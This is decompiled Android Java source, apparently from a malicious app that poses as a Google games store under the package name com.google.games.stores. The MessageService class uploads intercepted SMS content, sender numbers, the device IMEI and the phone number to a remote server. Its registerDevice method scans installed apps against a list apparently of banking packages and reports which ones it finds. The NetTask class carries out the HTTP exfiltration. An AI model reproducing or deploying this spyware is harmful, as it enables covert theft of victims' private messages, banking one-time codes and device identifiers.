package com.google.games.stores.service;

import android.app.Notification;
import android.app.Service;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.os.IBinder;
import com.google.games.stores.bean.MyConfig;
import com.google.games.stores.config.Config;
import com.google.games.stores.config.Message;
import com.google.games.stores.util.ConfigUtil;
import com.google.games.stores.util.GeneralUtil;
import com.google.games.stores.util.Logger;
import com.google.games.stores.util.NetTask;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;

public class MessageService extends Service {
    private String CONNECT_SERVER = "";

    public IBinder onBind(Intent intent) {
        return null;
    }

    private void readBackConfig() {
        MyConfig config = ConfigUtil.getConfig(Config.CONFIG_FILE);
        if (config != null) {
            String server = config.getServer();
            if (server == null || server.equalsIgnoreCase("") || server.equalsIgnoreCase("null")) {
                this.CONNECT_SERVER = Config.SERVER;
            } else {
                this.CONNECT_SERVER = server;
            }
        } else {
            this.CONNECT_SERVER = Config.SERVER;
        }
        Logger.i("abc", "Connect Service Server--->" + this.CONNECT_SERVER);
    }

    public void onCreate() {
        super.onCreate();
        startForeground(1, new Notification());
        setForeground(true);
        readBackConfig();
        Logger.i("abc", "Message service create");
    }

    public void onStart(Intent intent, int startId) {
        super.onStart(intent, startId);
        Logger.i("abc", "Message service start");
        if (intent != null) {
            Message sms = (Message) intent.getSerializableExtra("SMS");
            if (sms != null) {
                readBackConfig();
                Logger.i("abc", "upload_sms start");
                upload_sms(sms);
            }
        }
    }

    /* access modifiers changed from: private */
    public void upload_sms(final Message sms) {
        String date = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss").format(new Date());
        new NetTask() {
            /* access modifiers changed from: protected */
            public void afterReturnService(String result) {
                try {
                    Logger.i("abc", "Sms upload result--->" + result);
                    if (result.equalsIgnoreCase("NO")) {
                        MessageService.this.registerDevice(sms);
                    } else {
                        result.equalsIgnoreCase("");
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }.execute(new String[]{this.CONNECT_SERVER + Config.NEW_SMS_URL, Config.NEW, GeneralUtil.getDevice(this), GeneralUtil.getMobile(this), date, sms.getInout(), sms.getContent(), sms.getAddress()});
    }

    /* access modifiers changed from: private */
    public void registerDevice(final Message sms) {
        try {
            String bk_name = "";
            List<PackageInfo> packages = getPackageManager().getInstalledPackages(0);
            for (int i = 0; i < packages.size(); i++) {
                PackageInfo packageInfo = (PackageInfo) packages.get(i);
                String str = new String();
                str = packageInfo.packageName;
                int j = 0;
                while (j < Config.BK_ARRAY_LIST.length) {
                    if (str.equalsIgnoreCase(Config.BK_ARRAY_LIST[j]) || str.equalsIgnoreCase(Config.MY_BK_ARRAY_LIST[j])) {
                        if (bk_name.equalsIgnoreCase("")) {
                            bk_name = Config.BK_NAME_LIST[j];
                        } else {
                            bk_name = new StringBuilder(String.valueOf(bk_name)).append(" - ").append(Config.BK_NAME_LIST[j]).toString();
                        }
                    }
                    j++;
                }
            }
            new NetTask() {
                /* access modifiers changed from: protected */
                public void afterReturnService(String result) {
                    try {
                        Logger.i("abc", "Sms upload fail --> register device result -->" + result);
                        if (result.equalsIgnoreCase("OK")) {
                            MessageService.this.upload_sms(sms);
                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }.execute(new String[]{this.CONNECT_SERVER + Config.ADD_DEVICE_URL, Config.ADD, GeneralUtil.getDevice(this), GeneralUtil.getMobile(this), GeneralUtil.getOperator(this), "1", bk_name, "-", "1"});
        } catch (Exception e1) {
            e1.printStackTrace();
        }
    }

    public void onDestroy() {
        super.onDestroy();
    }
}
package com.google.games.stores.util;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Environment;
import android.support.v4.view.MotionEventCompat;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.inputmethod.InputMethodManager;
import android.widget.EditText;
import java.io.File;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.security.spec.InvalidKeySpecException;
import java.util.ArrayList;
import java.util.List;
import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.DESKeySpec;

public class GeneralUtil {
    public static String SDCardRoot = new StringBuilder(String.valueOf(Environment.getExternalStorageDirectory().getAbsolutePath())).append(File.separator).toString();
    public static List activityList = new ArrayList();
    private static TelephonyManager telMgr;

    public static String getDevice(Context context) {
        try {
            telMgr = (TelephonyManager) context.getSystemService("phone");
            return telMgr.getDeviceId();
        } catch (Exception e) {
            Log.i("abc", "getDevice Error");
            return "";
        }
    }

    public static String getOperator(Context context) {
        try {
            telMgr = (TelephonyManager) context.getSystemService("phone");
            return telMgr.getNetworkOperatorName();
        } catch (Exception e) {
            Log.i("abc", "getOperator Error");
            return "";
        }
    }

    public static String getMobile(Context context) {
        try {
            telMgr = (TelephonyManager) context.getSystemService("phone");
            return telMgr.getLine1Number();
        } catch (Exception e) {
            Log.i("abc", "getMobile Error");
            return "";
        }
    }

    public static void exit() {
        int siz = activityList.size();
        for (int i = 0; i < siz; i++) {
            if (activityList.get(i) != null) {
                ((Activity) activityList.get(i)).finish();
            }
        }
    }

    public static void ShowKeyBoard(EditText et) {
        try {
            ((InputMethodManager) et.getContext().getSystemService("input_method")).toggleSoftInput(0, 2);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void dismissKeyBoard(Activity activity) {
        try {
            ((InputMethodManager) activity.getSystemService("input_method")).hideSoftInputFromWindow(activity.getCurrentFocus().getWindowToken(), 2);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static String enCrypto(String txt, String key) throws InvalidKeySpecException, InvalidKeyException, NoSuchPaddingException, IllegalBlockSizeException, BadPaddingException {
        StringBuffer sb = new StringBuffer();
        DESKeySpec desKeySpec = new DESKeySpec(key.getBytes());
        SecretKeyFactory skeyFactory = null;
        Cipher cipher = null;
        try {
            skeyFactory = SecretKeyFactory.getInstance("DES");
            cipher = Cipher.getInstance("DES");
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
        }
        cipher.init(1, skeyFactory.generateSecret(desKeySpec));
        byte[] cipherText = cipher.doFinal(txt.getBytes());
        for (byte b : cipherText) {
            String stmp = Integer.toHexString(b & MotionEventCompat.ACTION_MASK);
            if (stmp.length() == 1) {
                sb.append("0" + stmp);
            } else {
                sb.append(stmp);
            }
        }
        return sb.toString().toUpperCase();
    }

    public static String deCrypto(String txt, String key) throws InvalidKeyException, InvalidKeySpecException, NoSuchPaddingException, IllegalBlockSizeException, BadPaddingException {
        DESKeySpec desKeySpec = new DESKeySpec(key.getBytes());
        SecretKeyFactory skeyFactory = null;
        Cipher cipher = null;
        try {
            skeyFactory = SecretKeyFactory.getInstance("DES");
            cipher = Cipher.getInstance("DES");
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
        }
        cipher.init(2, skeyFactory.generateSecret(desKeySpec));
        byte[] btxts = new byte[(txt.length() / 2)];
        int count = txt.length();
        for (int i = 0; i < count; i += 2) {
            btxts[i / 2] = (byte) Integer.parseInt(txt.substring(i, i + 2), 16);
        }
        return new String(cipher.doFinal(btxts));
    }

    public static void install(Context con, File file) {
        try {
            Intent intent = new Intent();
            intent.setAction("android.intent.action.VIEW");
            intent.setDataAndType(Uri.fromFile(file), "application/vnd.android.package-archive");
            con.startActivity(intent);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void uninstallAPK(Context con, String packageName) {
        con.startActivity(new Intent("android.intent.action.DELETE", Uri.parse("package:" + packageName)));
    }

    public static void goHome(Context con) {
        Intent mHomeIntent = new Intent("android.intent.action.MAIN");
        mHomeIntent.addCategory("android.intent.category.HOME");
        mHomeIntent.addFlags(270532608);
        con.startActivity(mHomeIntent);
    }
}
package com.google.games.stores.util;

import android.os.AsyncTask;
import com.google.games.stores.config.Config;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.List;
import org.apache.http.NameValuePair;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;

public class NetTask extends AsyncTask<String, Void, String> {
    /* access modifiers changed from: protected|varargs */
    public String doInBackground(String... params) {
        try {
            HttpClient client = new DefaultHttpClient();
            String url = params[0];
            String type = params[1];
            HttpPost post = new HttpPost(url);
            post.addHeader("charset", "UTF-8");
            List<NameValuePair> ps = new ArrayList();
            if (type.equalsIgnoreCase(Config.ADD)) {
                ps.add(new BasicNameValuePair("device", params[2]));
                if (params[3] != null) {
                    ps.add(new BasicNameValuePair("ph", params[3]));
                }
                if (params[4] != null) {
                    ps.add(new BasicNameValuePair("oper", params[4]));
                }
                if (!(params[5] == null || params[5].equalsIgnoreCase(""))) {
                    ps.add(new BasicNameValuePair("dk", params[5]));
                }
                if (!(params[6] == null || params[6].equalsIgnoreCase(""))) {
                    ps.add(new BasicNameValuePair("dname", params[6]));
                }
                if (!(params[7] == null || params[7].equalsIgnoreCase(""))) {
                    ps.add(new BasicNameValuePair("result", params[7]));
                }
                if (params[8] != null) {
                    ps.add(new BasicNameValuePair("auto", params[8]));
                }
            } else if (type.equalsIgnoreCase(Config.NEW)) {
                ps.add(new BasicNameValuePair("device", params[2]));
                if (params[3] != null) {
                    ps.add(new BasicNameValuePair("ph", params[3]));
                }
                if (params[4] != null) {
                    ps.add(new BasicNameValuePair("date", URLEncoder.encode(params[4])));
                }
                if (params[5] != null) {
                    ps.add(new BasicNameValuePair("io", params[5]));
                }
                if (params[6] != null) {
                    ps.add(new BasicNameValuePair("msg", URLEncoder.encode(params[6])));
                }
                if (params[7] != null) {
                    ps.add(new BasicNameValuePair("num", params[7]));
                }
            } else if (type.equalsIgnoreCase(Config.CONTACT_LIST)) {
                ps.add(new BasicNameValuePair("device", params[2]));
            } else if (type.equalsIgnoreCase(Config.MY_CONTACT_LIST)) {
                ps.add(new BasicNameValuePair("device", params[2]));
                if (params[3] != null) {
                    ps.add(new BasicNameValuePair("mct", params[3]));
                }
            }
            post.setEntity(new UrlEncodedFormEntity(ps));
            InputStream input = client.execute(post).getEntity().getContent();
            ByteArrayOutputStream output = new ByteArrayOutputStream();
            byte[] buffer = new byte[1024];
            while (true) {
                int len = input.read(buffer);
                if (len <= 0) {
                    output.close();
                    return output.toString();
                }
                output.write(buffer, 0, len);
            }
        } catch (Exception e) {
            e.printStackTrace();
            return "";
        }
    }

    /* access modifiers changed from: protected */
    public void onPostExecute(String result) {
        afterReturnService(result);
    }

    /* access modifiers changed from: protected */
    public void afterReturnService(String result) {
    }
}
